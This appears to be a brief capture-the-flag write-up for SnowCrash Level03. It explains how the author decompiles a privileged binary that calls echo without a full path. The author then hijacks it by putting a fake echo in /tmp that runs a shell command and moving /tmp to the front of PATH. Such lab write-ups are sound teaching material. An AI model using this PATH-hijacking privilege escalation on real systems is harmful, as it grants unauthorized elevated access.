# WRITE UP

**Box**:            SnowCrash

**Name**:           Level03

**Description**:    Find the flag to connect to level01

**Category**:       Reverse Engineering

**Difficulty**:     Easy

---

## Basic Checking
Looking for the basics informations as:
```bash
whoami
```
```bash
pwd
```
```bash
ls -la
```
HERE !! There is a file **level03** (this is the name of the actual CTF) and it's executable.

---

## Exploit

```bash
./level03
```

return
'''Exploit me'''

I sadly can't just read the file because it already have been compiled! Then i get it on my own computer by running:

```bash
scp -p 4242 level03@<ip>:level03 ~/Desktop
```
I usually would use Ghidra, but thanks to permission issues I would rather use __https://dogbolt.org__

Here I can see that the file call the **echo** built in function by specifying the pass of it.
As the executable do the command with the sudo permission, If I can use it to run whatever I want I could do something interesting.

I create a fake **echo** file in wich there is:
```bash
/bin/sh -c 'getflag'
```

Then place the path of it before the path of the actual echo by running:
```bash
export PATH=/tmp:$PATH
```

Then I run the initial **level03** executable.

**FLAG FOUND**

